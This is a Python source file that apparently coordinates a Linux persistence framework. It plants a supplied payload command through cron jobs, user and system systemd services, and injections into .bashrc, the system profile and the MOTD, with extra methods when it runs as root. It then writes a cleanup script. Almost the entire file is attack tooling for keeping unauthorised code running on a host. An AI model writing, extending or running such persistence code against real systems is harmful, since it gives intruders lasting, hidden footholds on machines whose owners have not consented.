# master_persistence/master.py
import os
import sys
from datetime import datetime

# Add parent directory so we can import sibling packages
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

class MasterPersistence:
    def __init__(self):
        self.installed = []
        self.removal_dir = os.path.join(os.path.dirname(__file__), "removal")
        os.makedirs(self.removal_dir, exist_ok=True)

    def _try_import_and_run(self, module_name, class_name, method_name, *args, **kwargs):
        """Safely import and execute a method from a sibling tool"""
        try:
            module = __import__(f"{module_name}.cli", fromlist=[class_name])
            instance = getattr(module, class_name)() if hasattr(module, class_name) else None
            method = getattr(instance or module, method_name, None)
            if method:
                result = method(*args, **kwargs)
                if result:
                    self.installed.append(result)
                    print(f"  [+] {module_name.replace('_', ' ').title()} → OK")
                else:
                    print(f"  [-] {module_name} → Skipped/Failed")
            return result
        except Exception as e:
            print(f"  [-] {module_name} → Not available ({e})")
            return None

    def install_all(self, payload_cmd):
        print("="*70)
        print("    LINUX PERSISTENCE FRAMEWORK – COMPREHENSIVE DEPLOYMENT")
        print("="*70)
        print(f"Payload → {payload_cmd}")
        print(f"User    → {os.getenv('USER')} | Root: {os.geteuid() == 0}\n")

        # === USER-LEVEL (no root needed) ===
        self._try_import_and_run("cron_persistence.cron_persistence.cli", "CronPersistence", 
                                "create_user_cron_persistence", payload_cmd, 10)
        self._try_import_and_run("cron_persistence.cron_persistence.cli", "CronPersistence", 
                                "create_reboot_cron", payload_cmd)
        self._try_import_and_run("systemd_persistence.systemd_persistence.cli", "SystemdPersistence", 
                                "create_user_service", None, payload_cmd)
        self._try_import_and_run("shell_persistence.shell_persistence.cli", "ShellProfilePersistence", 
                                "inject_bashrc", payload_cmd, True)

        # === ROOT-ONLY ===
        if os.geteuid() == 0:
            self._try_import_and_run("cron_persistence.cron_persistence.cli", "CronPersistence", 
                                    "create_system_cron_persistence", payload_cmd)
            self._try_import_and_run("systemd_persistence.systemd_persistence.cli", "SystemdPersistence", 
                                    "create_system_service", None, payload_cmd)
            self._try_import_and_run("shell_persistence.shell_persistence.cli", "ShellProfilePersistence", 
                                    "inject_system_profile", payload_cmd)
            self._try_import_and_run("shell_persistence.shell_persistence.cli", "ShellProfilePersistence", 
                                    "inject_motd", payload_cmd)

        # === Summary & Cleanup Script ===
        self._generate_removal_script()
        print(f"\n[+] Deployment complete! {len(self.installed)} methods installed.")
        print(f"[*] Use the generated removal script to clean up.")

    def _generate_removal_script(self):
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        script_path = os.path.join(self.removal_dir, f"remove_all_{ts}.sh")
        
        with open(script_path, "w") as f:
            f.write("#!/bin/bash\n")
            f.write(f"# Auto-generated removal script – {datetime.now()}\n\n")
            for item in self.installed:
                cmd = item.get("remove_command") or item.get("remove_cmd") or "# no remove command"
                f.write(f"# {item.get('method', 'Unknown')}\n")
                f.write(f"{cmd} 2>/dev/null || true\n\n")
            f.write('echo "All known persistence removed."\n')
        
        os.chmod(script_path, 0o755)
        print(f"[+] Removal script → {script_path}")